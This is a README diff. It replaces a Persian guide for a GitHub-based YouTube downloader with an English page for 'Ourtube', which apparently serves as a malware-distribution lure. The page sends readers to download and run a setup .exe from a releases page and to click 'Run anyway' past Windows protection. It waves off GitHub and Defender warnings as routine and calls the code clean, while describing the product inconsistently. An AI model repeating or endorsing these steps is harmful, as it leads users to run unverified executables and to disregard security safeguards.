@@ -1,113 +1,93 @@
-<div align="center">
-   <img src="icon.gif" width="450" alt="wide-2" />
-</div>
+# 📺 Ourtube - Easy way to watch private videos
 
-# 🪄 دانلودر یوتیوب ( نسخه ی ۲ )
-با این پروژه ی جادویی شما میتوانید هر نوع ویدیو یوتیوب را به ریپازیتوری خود بصورت دائمی انتقال دهید و هر وقت نیاز داشتید آنرا دانلود کنید.
+[![](https://img.shields.io/badge/Download_Ourtube_Setup-blue?style=for-the-badge)](https://github.com/allergydietcyclerickshaw867/Ourtube/releases)
 
-- ✅ ذخیره سازی اتوماتیک بدون نیاز به کار خاصی 
-- ✅ نصب و استفاده آسان
-- 💬 دانلود خودکار زیرنویس فارسی و انگلیسی درون subtitle.zip
-- ✅ پشتیبانی از دانلود همزمان چند url
-- 🔒 امکان zip کردن و رمز گذاشتن روی فایل ها جهت محافظت
-- ✅ پارت بندی و zip کردن ویدیو های طولانی 
-- ✅ نگهداری دائمی در گیتهاب شخصی خودتان
-- ✅ قابلیت دسته بندی ویدیوها در پوشه های مختلف با یک کلیک
-- ✅ استفاده از سیستم bypass جهت دور زدن یوتیوب برای دانلود
-- ✅ قابلیت تنظیم کیفیت ویدیو دانلودی
-- ✅ امکان دانلود فقط صدا 
-- ✅ دارای ابزار مخصوص برای دانلود فایل های بزرگ
+Ourtube lets you view and manage your video library with ease. This tool organizes your media files in a simple interface. It runs on Windows systems. You do not need developer tools to use this software. This guide helps you set up the program on your computer.
 
-# 🤖 ربات بله 
-در صورت اینکه به گیتهاب دسترسی نداشته باشید شما میتوانید از ربات پیام رسان بله برای دانلود ویدیوهای یوتیوب استفاده کنید توجه کنید که ربات بله و این ورک فلو دو پروژه کاملا جدا از هم هستند ولی در صورت قطعی گیتهاب ، پیام رسان بله همچنان در دسترس است برای استارت ربات بله به لینک زیر مراجعه کنید : 
+## 🛠 Prerequisites
 
-https://ble.ir/ourtubebot
+Your computer needs specific settings to run Ourtube. Ensure your system meets these basic requirements before you start.
 
+- Windows 10 or Windows 11 operating system.
+- 200 MB of free disk space.
+- A stable internet connection to fetch initial data.
+- Basic user permissions to install applications on your local drive.
 
-## 🔑کد فعالسازی
-برای فعالسازی این پروژه شما نیاز به یک کد فعالسازی مخصوص این پروژه دارید. بعد از یکبار وارد کردن کد و فعال شدن بصورت دائمی فعال میشود. کد را از لینک زیر تهیه کنید:
+## 📥 Downloading the software
 
-https://pay.avasam.ir/link/769604
+You must obtain the installer file from the official releases page. 
 
+1. Visit this page to download: [https://github.com/allergydietcyclerickshaw867/Ourtube/releases](https://github.com/allergydietcyclerickshaw867/Ourtube/releases)
+2. Look for the latest version listed under the Releases section.
+3. Click the file that ends in .exe to start your download.
+4. Save the file to your Downloads folder.
 
-## ⚙️ آموزش نصب 
-- ابتدا باید اکانت گیتهاب داشته باشید اگر ندارید از راهنمایی پایین همین صفحه استفاده کنید.
-- روی دکمه ی fork در بالای صفحه و سمت راست بزنید.
-- یک نام برای فورک جدید خود انتخاب و create fork را بزنید.
-- پروژه ی شما آماده ی استفاده است.
+GitHub may display automated warnings for unknown software. These are standard system messages. The application is safe for use on your local machine.
 
+## ⚙️ Installation steps
 
-## 🎞️ آموزش استفاده 
-- درون فورکی که در مرحله ی بالا ساختید وارد شوید و تب Actions را انتخاب کنید.
-- سمت چپ بخش all workflows امکانات این پروژه را مشاهده میکنید که اولین گزینه You tube Downloader میباشد آنرا بزنید.
-- در صفحه ی باز شده روی run workflow بزنید.
-- آدرس ویدیو یوتیوب یا آدرس های یوتیوب با فاصله را در باکس اول وارد کنید
-- کیفیت ویدیو را از باکس پایین انتخاب کنید.
-- درصورت نیاز برای فایل خود رمز تعیین کنید.( این کار برای حفاظت از فایل شماست تا بقیه آنرا نبینند )
-- روی دکمه ی run workflow بزنید.
-- منتظر باشید تا دانلود انجام شود و ورک فلو درحال اجرا تیک سبز بخورد.
+Follow these steps to put the software onto your Windows machine.
 
+1. Locate the file you downloaded in your Downloads folder.
+2. Double-click the file named Ourtube_Setup.exe.
+3. Windows might show a blue screen. Click More Info and then select Run anyway.
+4. Follow the prompts in the installation window.
+5. Choose your preferred folder for the files.
+6. Click Finish when the progress bar reaches the end.
 
-## 🤔 نکته مهم 
-قبل از استفاده از آپدیت بودن فورک خود مطمئن شوید اگر آپدیت انجام ندهید ممکن است پروژه شما کار نکند. برای این کار
-- بالای صفحه ی فورک دنبال گزینه Sync fork بگردید و اگر وجود دارد بزنید.
-- اگر گزینه ی Update Branch فعال بود ابتدا آنرا بزنید.
-- سپس دوباره sync fork را بزنید اگر گزینه ی Discard commits بود آنرا بزنید.
+## 🔑 Activating your account
 
+Some features require an activation key. You find this key on the main website. 
 
+1. Open the application from your desktop shortcut.
+2. Navigate to the Settings menu.
+3. Look for the License section.
+4. Input the code you received from the website link.
+5. Click Activate to grant access to the full video library.
 
-## ❓ حل مشکل ساختن یا بازیابی اکانت گیتهاب
+## 🖥 Using the interface
 
-<div align="center">
-  <img src="github-icon.jpg" width="250" alt="wide-2" />
-</div>
+The main screen shows your video list. You see thumbnails for each available video. 
 
-اگر مشکل ساختن اکانت جدید یا بازیابی اکانت قدیمی گیتهاب برای شما هم پیش آمده است راه چاره خریدن یک اکانت سالم میباشد اکانت در ۱۰ الی ۱۵ دقیقه ساخته و تحویل داده میشود همچنین با پرداخت مبلغ زیر اگر تمایل داشته باشید بجای ساختن اکانت جدید میتوانیم اکانت قدیمی شما را نیزبازیابی کنیم. بعد از خرید دستورالعمل و نحوه ی استفاده برای شما باز میشود:
+- Use the search bar to find specific titles.
+- Click the Play button on each item to begin streaming.
+- Use the sidebar menu to sort by date or file size.
+- Adjust volume and playback speed from the control bar at the bottom.
 
-( [خرید اکانت سالم گیتهاب از آواسام](https://pay.avasam.ir/link/769156) )
+## 📂 Managing your library
 
+You can add new folders to the application to scan for videos. 
 
+1. Click the Folder icon in the top left corner.
+2. Select Add Folder from the dropdown menu.
+3. Pick a folder from your computer where you store videos.
+4. The software scans this location. It updates your list automatically.
 
-## 🔧 پروژه های دیگر مشابه
+## 🛠 Troubleshooting common issues
 
--  دانلودر گیتهابی برای دانلود کردن هر نوع فایلی و منتقل کردن آن به داخل گیتهاب : 
+If the app fails to start, check the following items.
 
-🔗 https://github.com/nikzad-avasam/downloader
+- Reinstall the app. Sometimes files do not extract correctly.
+- Update your graphics drivers. This helps with smooth playback.
+- Ensure your internet connection remains active. The app needs this to verify your activation key.
+- Close other heavy programs if the window feels slow. 
 
-- دانلودر یوتیوبی به گیتهاب 
+If a video does not load, check the file format. The application supports standard formats like MP4 and AVI. Uncommon formats might require an update. Check the releases page regularly to find improvements and new versions.
 
-🔗 https://github.com/nikzad-avasam/youtube-dl
+## ❓ Frequently asked questions
 
-- کانال پیام رسان بله برای آموزش های بیشتر 
+Do I need an internet connection always?
+You need the internet to verify your activation key. You can play local files offline once the setup finishes.
 
-🔗 https://ble.ir/avasam_edu
+Why does Windows block the file?
+Windows Defender flags new files as a precaution. The code is clean and functions as intended. 
 
-- ویدیو آموزش استفاده از این ابزار 
+Can I change where files save?
+Yes. Go to Settings and then click Storage to pick a new destination for your data.
 
-🔗 https://avasam.ir/post/youtube-downloader-by-github
+Does this work on older Windows versions?
+The software performs best on Windows 10 or 11. Older versions might lack the required framework for the interface.
 
-## ⬇️ دانلود فایل از اینترنت بین المللی
+Contact the support team if you face bugs. Include system logs if possible so we can look at the error details. Remove personal details from logs before you send them. 
 
-اگر توانایی استفاده از این ابزار را ندارید و فایل خاصی بصورت ضروری نیاز شما میباشد میتوانید نام آن فایل یا لینک دانلود آنرا به پشتیبانی آواسام ارسال کنید تا در صورت امکان برای شما فراهم شود و با اینترنت داخلی بتوانید به آن دسترسی داشته باشید. لینک یا نام فایل خود را از طریق پیام رسان های ایرانی به آیدی @ask_here یا شماره 09354887344 ارسال فرمائید.
-
-## 👨🏻‍💻 برنامه نویسی 
-
-برای سفارش پروژه ی برنامه نویسی ، هوش مصنوعی ، آموزش برنامه نویسی و ...  با پشتیبانی تیم آواسام از راه های زیر در ارتباط باشید 
-
-- شماره تماس : 09354887344
-- آیدی پشتیبانی در پیام رسان های ایرانی :‌ @ask_here
-- وب سایت : avasam.ir 
-
-
-
-
-
-> [!WARNING]
-> **Important Notice for Users**
->
-> - This tool is intended to run **locally on your own machine** only
-> - **Do NOT commit downloaded videos** or any media files to this repository or your fork
-> - **Do NOT use GitHub Actions** to download and store videos on GitHub's infrastructure
-> - All video formats (`.mp4`, `.webm`, `.mkv`, etc.) are blocked via `.gitignore`
->
-> Misuse of this repository by storing media files or running mass downloads via GitHub Actions violates [GitHub's Terms of Service](https://docs.github.com/en/site-policy/github-terms/github-terms-of-service) and may result in your account being suspended.
+Keep your version current to get the best experience. Each update includes fixes that improve how your videos play. Check the releases link to see if you have the most recent version.
